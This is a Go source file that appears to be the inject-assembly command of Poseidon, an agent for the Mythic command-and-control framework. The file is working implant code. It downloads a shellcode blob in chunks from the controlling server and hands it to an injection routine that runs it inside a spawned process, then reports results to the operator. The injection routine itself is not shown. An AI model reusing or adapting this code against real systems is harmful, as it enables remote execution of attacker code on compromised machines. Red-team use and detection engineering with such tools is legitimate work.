package inject_assembly

import (
	// Standard
	"encoding/json"
	"fmt"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type injectAssemblyArgs struct {
	FileID    string `json:"file_id"`
	ArgString string `json:"args"`
	SpawnAs   string `json:"spawnas"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := injectAssemblyArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = ""
	r.Task = &task
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	shellcode := make([]byte, 0)

	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		} else {
			shellcode = append(shellcode, newBytes...)
		}
	}

	if len(shellcode) == 0 {
		msg.SetError("Failed to get file")
		task.Job.SendResponses <- msg
		return
	}

	output, err := injectShellcode(shellcode, args.SpawnAs)
	if err != nil {
		msg.Completed = false
		msg.UserOutput = err.Error()
		task.Job.SendResponses <- msg
		return
	}
	msg.UserOutput = output
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
